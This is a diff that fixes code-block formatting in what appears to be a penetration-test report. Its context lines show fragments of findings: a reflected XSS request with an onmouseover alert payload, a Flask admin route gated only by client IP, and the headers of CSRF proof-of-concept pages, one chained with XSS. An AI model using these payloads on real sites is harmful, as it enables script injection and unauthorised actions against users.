@@ -99,7 +99,8 @@ can read any file readable by the web server, including /etc/passwd,
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /data HTTP/2
+  ```
+  POST /data HTTP/2
   Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0
@@ -171,7 +172,8 @@ HTML escaping, allowing injection of HTML and JavaScript.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /profile HTTP/2
+  ```
+  POST /profile HTTP/2
   Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0
@@ -238,7 +240,8 @@ onmouseover).
 **Example HTTP Request**
 
   --------------------------------------------------------------------------
-  ```GET /search?search_term=%22+onmouseover%3Dalert%28document.domain%29+x%3D%22 HTTP/2
+  ```
+  GET /search?search_term=%22+onmouseover%3Dalert%28document.domain%29+x%3D%22 HTTP/2
   Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0
@@ -389,7 +392,8 @@ enabling arbitrary command execution as the nobody user.
 **Python Code Snip**
 
   -----------------------------------------------------------------------
-  ```@app.route("/admin", methods=["GET"])
+  ```python
+  @app.route("/admin", methods=["GET"])
   def admin():
       if request.remote_addr not in ["127.0.0.1", "localhost","::1"]:
           return "Access Denied", 403
@@ -476,7 +480,8 @@ injecting malicious bio content.
 **PoCs**
 
   -----------------------------------------------------------------------
-  ```CSRF test
+  ```
+  CSRF test
   <!DOCTYPE html>
   <html>
   <head><title>CSRF Pure PoC</title></head>
@@ -495,7 +500,8 @@ injecting malicious bio content.
   </html>
 ```
   -----------------------------------------------------------------------
-  ```CSRF chained with XSS
+  ```
+  CSRF chained with XSS
   <!DOCTYPE html>
   <html>
   <body>
@@ -510,7 +516,8 @@ injecting malicious bio content.
   </html>
 ```
   -----------------------------------------------------------------------
- ``` Silent Version
+ ```
+  Silent Version
   <!DOCTYPE html>
   <html>
   <head>
@@ -580,7 +587,8 @@ enabling defacement and potential phishing.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /profile HTTP/2
+  ```
+  POST /profile HTTP/2
   Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0
